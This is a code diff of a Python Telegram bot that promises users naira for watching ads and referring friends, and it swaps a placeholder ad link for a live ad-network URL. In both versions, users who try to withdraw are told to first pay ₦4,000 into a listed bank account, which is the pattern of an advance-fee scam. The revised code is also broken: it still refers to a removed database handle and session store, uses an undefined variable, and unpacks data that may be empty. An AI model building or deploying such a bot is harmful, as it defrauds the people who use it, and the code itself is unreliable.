@@ -7,34 +7,18 @@ from telegram.ext import (
     ContextTypes,
     filters,
 )
-from dotenv import load_dotenv
+from backend import insert_new_user, get_user_data, update_referrals, handle_withdrawal
 import os
-import mysql.connector
+from dotenv import load_dotenv
 
 # Load environment variables
 load_dotenv()
 BOT_TOKEN = os.getenv("BOT_TOKEN")
-MYSQLPORT = int(os.getenv("MYSQLPORT", 3306))
 
-# MySQL Connection
-try:
-    db = mysql.connector.connect(
-        host=os.getenv("MYSQLHOST"),
-        user=os.getenv("MYSQLUSER"),
-        password=os.getenv("MYSQLPASSWORD"),
-        database=os.getenv("MYSQLDATABASE"),
-        port=MYSQLPORT
-    )
-    print("Connected to database successfully.")
-except mysql.connector.Error as err:
-    print(f"Error connecting to database: {err}")
-    exit(1)
+# Telegram Bot App
+telegram_app = Application.builder().token(BOT_TOKEN).build()
 
-# Session storage
-user_stage = {}
-user_data = {}
-
-# Inline Keyboard Menu
+# Menu Keyboard Builder
 def build_menu_keyboard(referrals, balance):
     keyboard = [
         [InlineKeyboardButton("📢 Watch Ads", callback_data='watch_ads')],
@@ -47,7 +31,7 @@ def build_menu_keyboard(referrals, balance):
     return InlineKeyboardMarkup(keyboard)
 
 # Start Command
-async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     telegram_id = user.id
     name = user.full_name
@@ -60,48 +44,25 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
         except ValueError:
             referrer_id = None
 
-    try:
-        with db.cursor(buffered=True) as cursor:
-            cursor.execute("SELECT * FROM users WHERE telegram_id = %s", (telegram_id,))
-            result = cursor.fetchone()
+    user_data = get_user_data(telegram_id)
 
-            if not result:
-                if referrer_id:
-                    cursor.execute("SELECT telegram_id FROM users WHERE telegram_id = %s", (referrer_id,))
-                    if not cursor.fetchone():
-                        referrer_id = None
+    if not user_data:
+        if referrer_id:
+            referrer_data = get_user_data(referrer_id)
+            if referrer_data:
+                insert_new_user(telegram_id, name, referrer_id)
+                update_referrals(referrer_id)
+        insert_new_user(telegram_id, name)
 
-                cursor.execute(
-                    "INSERT INTO users (telegram_id, name, balance, referrals, referred_by) VALUES (%s, %s, %s, %s, %s)",
-                    (telegram_id, name, 0, 0, referrer_id)
-                )
-                db.commit()
+    referrals, balance = user_data
+    markup = build_menu_keyboard(referrals, balance)
+    welcome_text = f"Welcome, {name}! 🎉\n\nChoose an option below to continue:"
+    if update.message:
+        await update.message.reply_text(welcome_text, reply_markup=markup)
+    elif update.callback_query:
+        await update.callback_query.message.reply_text(welcome_text, reply_markup=markup)
 
-                if referrer_id and referrer_id != telegram_id:
-                    cursor.execute("UPDATE users SET referrals = referrals + 1 WHERE telegram_id = %s", (referrer_id,))
-                    db.commit()
-
-            cursor.execute("SELECT referrals, balance FROM users WHERE telegram_id = %s", (telegram_id,))
-            referrals, balance = cursor.fetchone()
-
-        markup = build_menu_keyboard(referrals, balance)
-
-        if update.message:
-            await update.message.reply_text(f"Welcome, {name}! 🎉")
-            await update.message.reply_text("Choose an option:", reply_markup=markup)
-        elif update.callback_query:
-            await update.callback_query.message.reply_text(f"Welcome back, {name}! 🎉")
-            await update.callback_query.message.reply_text("Choose an option:", reply_markup=markup)
-
-    except mysql.connector.Error as err:
-        print(f"DB Error: {err}")
-        msg = "❌ Database error. Please try again later."
-        if update.message:
-            await update.message.reply_text(msg)
-        elif update.callback_query:
-            await update.callback_query.message.reply_text(msg)
-
-# Button Actions
+# Button Click Handler
 async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
@@ -109,29 +70,26 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = query.from_user.id
 
     if data == "watch_ads":
-        ad_link = f"https://yourserver.com/ads?user_id={user_id}"
+        ad_link = "https://www.profitableratecpm.com/j4wa6ksu?key=6ad2b237a51106f25754b3e61fbf8cb2"
+        keyboard = InlineKeyboardMarkup([
+            [InlineKeyboardButton("▶️ Watch Ad", url=ad_link)]
+        ])
         await query.message.reply_text(
-            "🎥 Please watch the full ad to earn ₦100.\n\n"
-            f"Click below:\n{ad_link}\n\n"
-            "⚠️ Do not minimize or close the video."
+            "🎥 Click the button below to watch the full ad and earn ₦100.\n\n⚠️ Do not minimize or exit until it finishes.",
+            reply_markup=keyboard
         )
 
     elif data == "refer":
         link = f"https://t.me/{context.bot.username}?start=ref{user_id}"
-        await query.message.reply_text(f"🔗 Your referral link:\n{link}\n\nEarn ₦200 per referral!")
+        await query.message.reply_text(
+            f"🔗 Your referral link:\n{link}\n\nEarn ₦200 for every person who joins using your link!"
+        )
 
     elif data == "withdraw":
-        with db.cursor(buffered=True) as cursor:
-            cursor.execute("SELECT account_number, account_name, bank_name, referrals, balance FROM users WHERE telegram_id = %s", (user_id,))
-            result = cursor.fetchone()
-            if result:
-                acc_num, acc_name, bank_name, referrals, balance = result
-                if referrals < 20 or balance < 6000:
-                    await query.message.reply_text("❌ You need at least 20 referrals and ₦6,000 balance to withdraw.")
-                    return
-
-        user_stage[user_id] = "account_number"
-        await query.message.reply_text("💳 Enter your account number:")
+        if handle_withdrawal(user_id):
+            await query.message.reply_text("✅ Withdrawal request accepted. We'll process your payment soon.")
+        else:
+            await query.message.reply_text("❌ You need at least 20 referrals and ₦6,000 balance to withdraw.")
 
     elif data == "show_referrals":
         with db.cursor(buffered=True) as cursor:
@@ -147,9 +105,9 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await start(update, context)
 
     elif data == "no_action":
-        await query.answer("Just showing your balance!")
+        await query.answer("✅ Balance displayed.")
 
-# Handle Text Inputs
+# Handle Text Replies (Withdraw Flow)
 async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     stage = user_stage.get(user_id)
@@ -180,26 +138,14 @@ async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
         context.user_data.clear()
 
         await update.message.reply_text("✅ Bank details saved!")
-
         await update.message.reply_text(
-            "🧾 *Next Step: Payment Required*\n\n"
-            "Send ₦4,000 to:\n"
-            "*Account Name:* John Doe\n"
-            "*Account Number:* 1234567890\n"
-            "*Bank:* First Bank\n\n"
-            "We’ll process your withdrawal within 6 hours after payment.",
+            "🧾 *Next Step: Payment Required*\n\nSend ₦4,000 to:\n*Account Name:* John Doe\n*Account Number:* 1234567890\n*Bank:* First Bank\n\n✅ We’ll process your withdrawal within 6 hours after payment.",
             parse_mode="Markdown"
         )
-        await start(update, context)
+        await query.answer()
 
-# Run Bot
-def main():
-    app = Application.builder().token(BOT_TOKEN).build()
-    app.add_handler(CommandHandler("start", start))
-    app.add_handler(CallbackQueryHandler(button_handler))
-    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
-    print("🚀 Bot is running...")
-    app.run_polling()
+telegram_app.add_handler(CommandHandler("start", start))
+telegram_app.add_handler(CallbackQueryHandler(button_handler))
+telegram_app.add_handler(MessageHandler(filters.TEXT, handle_text))
 
-if __name__ == '__main__':
-    main()
+telegram_app.run_polling()
